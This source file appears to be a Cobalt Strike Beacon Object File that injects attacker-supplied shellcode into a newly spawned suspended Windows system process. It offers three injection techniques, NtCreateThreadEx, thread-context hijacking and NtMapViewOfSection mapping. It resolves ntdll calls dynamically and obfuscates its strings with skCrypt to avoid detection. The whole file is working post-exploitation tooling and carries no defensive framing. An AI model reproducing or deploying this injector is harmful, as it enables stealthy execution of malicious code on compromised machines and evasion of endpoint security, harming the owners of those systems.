#include <windows.h>
#include "addresshunter.h"
#include "functions.h"
#include "skCrypt.hpp"

extern "C" {
	#include "beacon.h"
	
	void __attribute__((naked)) ___chkstk_ms(void)
	{
		__asm__ __volatile__ (
			"ret"
		);
	}
}


#define STATUS_SUCCESS ((NTSTATUS)0x00000000L) // ntsubauth
#define NtGetCurrentProcess() ((HANDLE)(LONG_PTR)-1)


BOOL InjectNtCreateThreadEx(CHAR* processName, LPVOID shellcode, SIZE_T shellcodeSize) {
	
	_NtCreateThreadEx NtCreateThreadEx = (_NtCreateThreadEx)GetSymbolAddress(GetModuleHandleEx2A(skCrypt("ntdll.dll")), skCrypt("NtCreateThreadEx"));
	_NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetSymbolAddress(GetModuleHandleEx2A(skCrypt("ntdll.dll")), skCrypt("NtAllocateVirtualMemory"));
	_NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)GetSymbolAddress(GetModuleHandleEx2A(skCrypt("ntdll.dll")), skCrypt("NtWriteVirtualMemory"));
	_NtProtectVirtualMemory NtProtectVirtualMemory = (_NtProtectVirtualMemory)GetSymbolAddress(GetModuleHandleEx2A(skCrypt("ntdll.dll")), skCrypt("NtProtectVirtualMemory"));
	_NtResumeThread NtResumeThread = (_NtResumeThread)GetSymbolAddress(GetModuleHandleEx2A(skCrypt("ntdll.dll")), skCrypt("NtResumeThread"));
	_NtWaitForSingleObject NtWaitForSingleObject = (_NtWaitForSingleObject)GetSymbolAddress(GetModuleHandleEx2A(skCrypt("ntdll.dll")), skCrypt("NtWaitForSingleObject"));
	_CreatePipe CreatePipe = (_CreatePipe)GetSymbolAddress(GetModuleHandleEx2A(skCrypt("kernel32.dll")), skCrypt("CreatePipe"));
	_SetHandleInformation SetHandleInformation = (_SetHandleInformation)GetSymbolAddress(GetModuleHandleEx2A(skCrypt("kernel32.dll")), skCrypt("SetHandleInformation"));


	NTSTATUS status = STATUS_SUCCESS;
	HANDLE hReadPipe, hWritePipe;
	SECURITY_ATTRIBUTES saAttr;

	// Set the bInheritHandle flag so pipe handles are inherited.
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;

	if(!CreatePipe(&hReadPipe, &hWritePipe, &saAttr, 0)) {
		BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[-] Failed to create pipe\n"));
		return FALSE;
	}

	if(!SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0)) {
		BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[-] Failed to set handle information\n"));
		return FALSE;
	}

	BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[+] Pipe created successfully\n"));

	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	OBJECT_ATTRIBUTES oa = {sizeof(oa)};

	ZeroMemoryEx(&si, sizeof(si));

	si.cb = sizeof(si);
	si.hStdError = hWritePipe;
	si.hStdOutput = hWritePipe;
	si.dwFlags |= STARTF_USESTDHANDLES;
	
	ZeroMemoryEx(&pi, sizeof(pi));

	LPVOID remoteBuffer = NULL;

	char processPath[MAX_PATH];
	_snprintf(processPath, sizeof(processPath), skCrypt("C:\\Windows\\System32\\%s"), processName);


	if (!CreateProcessA(processPath, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, (LPSTARTUPINFOA)&si, &pi)) {
		BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[-] Failed to create process\n"));


		CloseHandle(hReadPipe);
		CloseHandle(hWritePipe);

		return FALSE;
	}

	BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[+] Process created successfully\n"));

	// NtAllocateVirutalMemory
	status = NtAllocateVirtualMemory(pi.hProcess, &remoteBuffer, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (status != STATUS_SUCCESS) {
		BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[-] Failed to allocate memory in remote process\n"));




		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		CloseHandle(hReadPipe);
		CloseHandle(hWritePipe);

		return FALSE;
	}
	BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[+] Memory allocated successfully\n"));

	DWORD oldProtect;
	status = NtProtectVirtualMemory(pi.hProcess, &remoteBuffer, (PULONG) & shellcodeSize, PAGE_EXECUTE_READWRITE, &oldProtect);
	if (status != STATUS_SUCCESS) {
		BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[-] Failed to change memory protection\n"));




		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		CloseHandle(hReadPipe);
		CloseHandle(hWritePipe);

		return FALSE;
	}
	BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[+] Memory protection changed successfully\n"));

	status = NtWriteVirtualMemory(pi.hProcess, remoteBuffer, shellcode, shellcodeSize, NULL);
	if (status != STATUS_SUCCESS) {
		BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[-] Failed to write shellcode to remote process\n"));
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		CloseHandle(hReadPipe);
		CloseHandle(hWritePipe);
		

		return FALSE;
	}
	BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[+] Shellcode written successfully\n"));
	
	HANDLE hThread = pi.hThread;

	status = NtCreateThreadEx(
		&hThread,
		THREAD_ALL_ACCESS,
		NULL,
		pi.hProcess,
		remoteBuffer,
		NULL,
		FALSE,
		0,
		0,
		0,
		NULL
	);
	if (status != STATUS_SUCCESS) {
		BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[-] Failed to create remote thread\n"));
		BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[-] Error code: %x\n"), status);

		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		CloseHandle(hReadPipe);
		CloseHandle(hWritePipe);

		return FALSE;
	}
	BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[+] Remote thread created successfully\n"));

	status = NtResumeThread(hThread, NULL);
	if (status != STATUS_SUCCESS) {
		BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[-] Failed to resume thread\n"));
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		CloseHandle(hReadPipe);
		CloseHandle(hWritePipe);
		CloseHandle(hThread);

		return FALSE;
	}
	BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[+] Thread resumed successfully\n"));

	if(hThread != NULL) {
		LARGE_INTEGER timeout;
		timeout.QuadPart = INFINITE;

		status = NtWaitForSingleObject(hThread, FALSE, &timeout);

		BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[+] Thread finished successfully\n"));
		BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[+] Shellcode executed successfully\n"));


		CloseHandle(hWritePipe);

		DWORD dwRead;
		CHAR chBuf[MAX_PATH];
		BOOL bSuccess = FALSE;

		HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);

		CHAR *output = (CHAR*)malloc(1);
		if (output == NULL) {
			BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[-] Failed to allocate memory\n"));
			return FALSE;
		}
		output[0] = '\0';

		for (;;) {

			bSuccess = ReadFile(hReadPipe, chBuf, MAX_PATH - 1, &dwRead, NULL);
			if (!bSuccess || dwRead == 0) break;
			chBuf[dwRead] = '\0';

			CHAR *new_output = (CHAR*)realloc(output, strlen(output) + dwRead + 2);
			if (new_output == NULL) {
				BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[-] Failed to allocate memory\n"));

				free(output);
				return FALSE;
			}
			output = new_output;

			strncat(output, chBuf, dwRead);
		}

		output[strlen(output)] = '\0';
		BeaconPrintf(CALLBACK_OUTPUT, skCrypt("[+] Shellcode Output:\n%s\n"), output);

		free(output);
	}






	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	CloseHandle(hThread);
	CloseHandle(hReadPipe);
	CloseHandle(hWritePipe);


	return TRUE;

}


BOOL InjectThreadHijacking(CHAR* processName, LPVOID shellcode, SIZE_T shellcodeSize) {
	
	_NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetSymbolAddress(GetModuleHandleEx2A(skCrypt("ntdll.dll")), skCrypt("NtAllocateVirtualMemory"));
	_NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)GetSymbolAddress(GetModuleHandleEx2A(skCrypt("ntdll.dll")), skCrypt("NtWriteVirtualMemory"));
	_NtProtectVirtualMemory NtProtectVirtualMemory = (_NtProtectVirtualMemory)GetSymbolAddress(GetModuleHandleEx2A(skCrypt("ntdll.dll")), skCrypt("NtProtectVirtualMemory"));
	_NtResumeThread NtResumeThread = (_NtResumeThread)GetSymbolAddress(GetModuleHandleEx2A(skCrypt("ntdll.dll")), skCrypt("NtResumeThread"));
	_NtWaitForSingleObject NtWaitForSingleObject = (_NtWaitForSingleObject)GetSymbolAddress(GetModuleHandleEx2A(skCrypt("ntdll.dll")), skCrypt("NtWaitForSingleObject"));
	_NtGetContextThread NtGetContextThread = (_NtGetContextThread)GetSymbolAddress(GetModuleHandleEx2A(skCrypt("ntdll.dll")), skCrypt("NtGetContextThread"));
	_NtSetContextThread NtSetContextThread = (_NtSetContextThread)GetSymbolAddress(GetModuleHandleEx2A(skCrypt("ntdll.dll")), skCrypt("NtSetContextThread"));
	_CreatePipe CreatePipe = (_CreatePipe)GetSymbolAddress(GetModuleHandleEx2A(skCrypt("kernel32.dll")), skCrypt("CreatePipe"));
	_SetHandleInformation SetHandleInformation = (_SetHandleInformation)GetSymbolAddress(GetModuleHandleEx2A(skCrypt("kernel32.dll")), skCrypt("SetHandleInformation"));
	// _snprintf_t _snprintf = (_snprintf_t)GetSymbolAddress(GetModuleHandleEx2A(skCrypt("msvcrt.dll")), skCrypt("_snprintf")); 

	NTSTATUS status = STATUS_SUCCESS;
	HANDLE hReadPipe, hWritePipe;
	SECURITY_ATTRIBUTES saAttr;

	// Set the bInheritHandle flag so pipe handles are inherited.
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;

	if(!CreatePipe(&hReadPipe, &hWritePipe, &saAttr, 0)) {
		BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[-] Failed to create pipe\n"));
		return FALSE;
	}

	if(!SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0)) {
		BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[-] Failed to set handle information\n"));
		return FALSE;
	}

	BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[+] Pipe created successfully\n"));

	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	OBJECT_ATTRIBUTES oa = {sizeof(oa)};

	ZeroMemoryEx(&si, sizeof(si));

	si.cb = sizeof(si);
	si.hStdError = hWritePipe;
	si.hStdOutput = hWritePipe;
	si.dwFlags |= STARTF_USESTDHANDLES;
	
	ZeroMemoryEx(&pi, sizeof(pi));

	LPVOID remoteBuffer = NULL;

	char processPath[MAX_PATH];
	_snprintf(processPath, sizeof(processPath), skCrypt("C:\\Windows\\System32\\%s"), processName);


	if (!CreateProcessA(processPath, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, (LPSTARTUPINFOA)&si, &pi)) {
		BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[-] Failed to create process\n"));


		CloseHandle(hReadPipe);
		CloseHandle(hWritePipe);

		return FALSE;
	}

	BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[+] Process created successfully\n"));

	// NtAllocateVirutalMemory
	status = NtAllocateVirtualMemory(pi.hProcess, &remoteBuffer, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (status != STATUS_SUCCESS) {
		BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[-] Failed to allocate memory in remote process\n"));




		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		CloseHandle(hReadPipe);
		CloseHandle(hWritePipe);

		return FALSE;
	}
	BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[+] Memory allocated successfully\n"));

	DWORD oldProtect;
	status = NtProtectVirtualMemory(pi.hProcess, &remoteBuffer, (PULONG) & shellcodeSize, PAGE_EXECUTE_READWRITE, &oldProtect);
	if (status != STATUS_SUCCESS) {
		BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[-] Failed to change memory protection\n"));




		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		CloseHandle(hReadPipe);
		CloseHandle(hWritePipe);

		return FALSE;
	}
	BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[+] Memory protection changed successfully\n"));

	status = NtWriteVirtualMemory(pi.hProcess, remoteBuffer, shellcode, shellcodeSize, NULL);
	if (status != STATUS_SUCCESS) {
		BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[-] Failed to write shellcode to remote process\n"));




		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		CloseHandle(hReadPipe);
		CloseHandle(hWritePipe);

		return FALSE;
	}
	BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[+] Shellcode written successfully\n"));

	CONTEXT ctx;
	ctx.ContextFlags = CONTEXT_FULL;
	status = NtGetContextThread(pi.hThread, &ctx);
	if (status != STATUS_SUCCESS) {
		BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[-] Failed to get thread context\n"));




		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		CloseHandle(hReadPipe);
		CloseHandle(hWritePipe);

		return FALSE;
	}
	BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[+] Thread context retrieved successfully\n"));
	#if defined(_M_X64) || defined(__amd64__)
        ctx.Rip = (DWORD64)remoteBuffer;
    #elif defined(_M_IX86) || defined(__i386__)
        ctx.Eip = (DWORD)remoteBuffer;
    #endif
	status = NtSetContextThread(pi.hThread, &ctx);
	if (status != STATUS_SUCCESS) {
		BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[-] Failed to set thread context\n"));




		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		CloseHandle(hReadPipe);
		CloseHandle(hWritePipe);

		return FALSE;
	}
	BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[+] Thread context set successfully\n"));
	status = NtResumeThread(pi.hThread, NULL);
	if (status != STATUS_SUCCESS) {
		BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[-] Failed to resume thread\n"));




		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		CloseHandle(hReadPipe);
		CloseHandle(hWritePipe);

		return FALSE;
	}
	BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[+] Thread resumed successfully\n"));

	if (pi.hThread != NULL) {
		LARGE_INTEGER timeout;
		timeout.QuadPart = INFINITE;

		status = NtWaitForSingleObject(pi.hThread, FALSE, &timeout);
		
		BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[+] Thread finished successfully\n"));
		BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[+] Shellcode executed successfully\n"));


		CloseHandle(hWritePipe);

		DWORD dwRead;
		CHAR chBuf[MAX_PATH];
		BOOL bSuccess = FALSE;

		HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);

		CHAR *output = (CHAR*)malloc(1);
		if (output == NULL) {
			BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[-] Failed to allocate memory\n"));
			return FALSE;
		}
		output[0] = '\0';

		for (;;) {

			bSuccess = ReadFile(hReadPipe, chBuf, MAX_PATH - 1, &dwRead, NULL);
			if (!bSuccess || dwRead == 0) break;
			chBuf[dwRead] = '\0';

			CHAR *new_output = (CHAR*)realloc(output, strlen(output) + dwRead + 2);
			if (new_output == NULL) {
				BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[-] Failed to allocate memory\n"));

				free(output);
				return FALSE;
			}
			output = new_output;

			strncat(output, chBuf, dwRead);
		}

		output[strlen(output)] = '\0';
		BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[+] Shellcode Output:\n%s\n"), output);

		free(output);
	} 





	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	CloseHandle(hReadPipe);
	CloseHandle(hWritePipe);


	return TRUE;

}


BOOL InjectNtMapViewOfSection(CHAR* processName, LPVOID shellcode, SIZE_T shellcodeSize) {
	
	_NtMapViewOfSection NtMapViewOfSection = (_NtMapViewOfSection)GetSymbolAddress(GetModuleHandleEx2A(skCrypt("ntdll.dll")), skCrypt("NtMapViewOfSection"));
	_NtCreateSection NtCreateSection = (_NtCreateSection)GetSymbolAddress(GetModuleHandleEx2A(skCrypt("ntdll.dll")), skCrypt("NtCreateSection"));
	_NtUnmapViewOfSection NtUnmapViewOfSection = (_NtUnmapViewOfSection)GetSymbolAddress(GetModuleHandleEx2A(skCrypt("ntdll.dll")), skCrypt("NtUnmapViewOfSection"));
	_NtGetContextThread NtGetContextThread = (_NtGetContextThread)GetSymbolAddress(GetModuleHandleEx2A(skCrypt("ntdll.dll")), skCrypt("NtGetContextThread"));
	_NtSetContextThread NtSetContextThread = (_NtSetContextThread)GetSymbolAddress(GetModuleHandleEx2A(skCrypt("ntdll.dll")), skCrypt("NtSetContextThread"));
	_NtResumeThread NtResumeThread = (_NtResumeThread)GetSymbolAddress(GetModuleHandleEx2A(skCrypt("ntdll.dll")), skCrypt("NtResumeThread"));
	_NtWaitForSingleObject NtWaitForSingleObject = (_NtWaitForSingleObject)GetSymbolAddress(GetModuleHandleEx2A(skCrypt("ntdll.dll")), skCrypt("NtWaitForSingleObject"));
	_CreatePipe CreatePipe = (_CreatePipe)GetSymbolAddress(GetModuleHandleEx2A(skCrypt("kernel32.dll")), skCrypt("CreatePipe"));
	_SetHandleInformation SetHandleInformation = (_SetHandleInformation)GetSymbolAddress(GetModuleHandleEx2A(skCrypt("kernel32.dll")), skCrypt("SetHandleInformation"));
	// _snprintf_t _snprintf = (_snprintf_t)GetSymbolAddress(GetModuleHandleEx2A(skCrypt("msvcrt.dll")), skCrypt("_snprintf")); 

	NTSTATUS status = STATUS_SUCCESS;
	HANDLE hReadPipe, hWritePipe;
	SECURITY_ATTRIBUTES saAttr;

	// Set the bInheritHandle flag so pipe handles are inherited.
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;

	if(!CreatePipe(&hReadPipe, &hWritePipe, &saAttr, 0)) {
		BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[-] Failed to create pipe\n"));
		return FALSE;
	}

	if(!SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0)) {
		BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[-] Failed to set handle information\n"));
		return FALSE;
	}

	BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[+] Pipe created successfully\n"));

	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	OBJECT_ATTRIBUTES oa = {sizeof(oa)};

	ZeroMemoryEx(&si, sizeof(si));

	si.cb = sizeof(si);
	si.hStdError = hWritePipe;
	si.hStdOutput = hWritePipe;
	si.dwFlags |= STARTF_USESTDHANDLES;
	
	ZeroMemoryEx(&pi, sizeof(pi));
	char processPath[MAX_PATH];
	
	_snprintf(processPath, sizeof(processPath), skCrypt("C:\\Windows\\System32\\%s"), processName);
	
	if (!CreateProcessA(processPath, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, (LPSTARTUPINFOA)&si, &pi)) {
		BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[-] Failed to create process\n"));
		CloseHandle(hReadPipe);
		CloseHandle(hWritePipe);

		return FALSE;
	}

	BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[+] Process created successfully\n"));
	HANDLE hSection = NULL;
	LARGE_INTEGER sectionSize = { shellcodeSize };
	status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
	if (status != STATUS_SUCCESS) {
		BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[-] Failed to create section\n"));
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		CloseHandle(hReadPipe);
		CloseHandle(hWritePipe);

		return FALSE;

	}
	BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[+] Section created successfully\n"));
	PVOID localBuffer = NULL;
	SIZE_T viewSize = 0;
	status = NtMapViewOfSection(
		hSection,
		NtGetCurrentProcess(),
		&localBuffer,
		0,
		shellcodeSize,
		NULL,
		&viewSize,
		ViewUnmap,
		0,
		PAGE_EXECUTE_READWRITE
	);

	if (status != STATUS_SUCCESS) {
		BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[-] Failed to map section\n"));
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		CloseHandle(hWritePipe);

		return FALSE;

	}
	BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[+] Section mapped successfully\n"));
	CopyMemoryEx(localBuffer, shellcode, shellcodeSize);

	PVOID remoteBuffer = NULL;
	status = NtMapViewOfSection(
		hSection,
		pi.hProcess,
		&remoteBuffer,
		0,
		shellcodeSize,
		NULL,
		&viewSize,
		ViewUnmap,
		0,
		PAGE_EXECUTE_READWRITE
	);

	if (status != STATUS_SUCCESS) {
		BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[-] Failed to map section\n"));
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		CloseHandle(hReadPipe);
		CloseHandle(hWritePipe);

		return FALSE;

	}
	BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[+] Section mapped successfully\n"));
	CONTEXT ctx;
	ctx.ContextFlags = CONTEXT_FULL;
	
	NtGetContextThread(pi.hThread, &ctx);
	#if defined(_M_X64) || defined(__amd64__)
        ctx.Rip = (DWORD64)remoteBuffer;
    #elif defined(_M_IX86) || defined(__i386__)
        ctx.Eip = (DWORD)remoteBuffer;
    #endif
	NtSetContextThread(pi.hThread, &ctx);

	status = NtResumeThread(pi.hThread, NULL);
	if (status != STATUS_SUCCESS) {
		BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[-] Failed to resume thread\n"));
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		CloseHandle(hReadPipe);
		CloseHandle(hWritePipe);

		return FALSE;
	}

	BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[+] Thread resumed successfully\n"));

	if(pi.hThread != NULL) {
		LARGE_INTEGER timeout;
		timeout.QuadPart = INFINITE;

		status = NtWaitForSingleObject(pi.hThread, FALSE, &timeout);

		BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[+] Thread finished successfully\n"));
		BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[+] Shellcode executed successfully\n"));

		CloseHandle(hWritePipe);

		DWORD dwRead;
		CHAR chBuf[MAX_PATH];
		BOOL bSuccess = FALSE;
		HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
		CHAR *output = (CHAR*)malloc(1);
		if (output == NULL) {
			BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[-] Failed to allocate memory\n"));
			return FALSE;
		}
		output[0] = '\0';

		for (;;) {
			bSuccess = ReadFile(hReadPipe, chBuf, MAX_PATH - 1, &dwRead, NULL);
			if (!bSuccess || dwRead == 0) break;
			chBuf[dwRead] = '\0';
			CHAR *new_output = (CHAR*)realloc(output, strlen(output) + dwRead + 2);
			if (new_output == NULL) {
				BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[-] Failed to allocate memory\n"));
				free(output);
				return FALSE;
			}
			output = new_output;
			strncat(output, chBuf, dwRead);
		}
		output[strlen(output)] = '\0';
		BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[+] Shellcode Output:\n%s\n"), output);
		free(output);
	
	}

	status = NtUnmapViewOfSection(NtGetCurrentProcess(), localBuffer);

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	CloseHandle(hReadPipe);
	CloseHandle(hWritePipe);
	return TRUE;
	
}

extern "C" {

	void go(char *args, int len) {
			char* targetProcess;
			char* targetTechnique;
			SIZE_T sc_len;
			char* sc_ptr;

			datap parser;

			BeaconDataParse(&parser, args, len);

			targetTechnique = BeaconDataExtract(&parser, NULL);
			targetProcess = BeaconDataExtract(&parser, NULL);
			sc_len = BeaconDataLength(&parser);
			sc_ptr = BeaconDataExtract(&parser, NULL);

			BeaconPrintf(CALLBACK_OUTPUT, skCrypt("Target Process: %s\n"), targetTechnique);
			BeaconPrintf(CALLBACK_OUTPUT, skCrypt("Target Process: %s\n"), targetProcess);
			BeaconPrintf(CALLBACK_OUTPUT, skCrypt("Shellcode Length: %d\n"), sc_len);
			BeaconPrintf(CALLBACK_OUTPUT, skCrypt("Shellcode Pointer: %p\n"), sc_ptr);


			if (strcmp(targetTechnique, skCrypt("NtCreateThreadEx")) == 0) {
				if (InjectNtCreateThreadEx(targetProcess, sc_ptr, sc_len)) {
					BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[+] Shellcode injected successfully\n"));
				} else {
					BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[-] Failed to inject shellcode\n"));
				}

			} else if (strcmp(targetTechnique, skCrypt("ThreadHijacking")) == 0) {
				if (InjectThreadHijacking(targetProcess, sc_ptr, sc_len)) {
					BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[+] Shellcode injected successfully\n"));
				} else {
					BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[-] Failed to inject shellcode\n"));
				}

			} else if (strcmp(targetTechnique, skCrypt("NtMapViewOfSection")) == 0) {
				if (InjectNtMapViewOfSection(targetProcess, sc_ptr, sc_len)) {
					BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[+] Shellcode injected successfully\n"));
				} else {
					BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[-] Failed to inject shellcode\n"));
				}
			} else {
				BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[-] Invalid technique\n"));
			}
	}
}

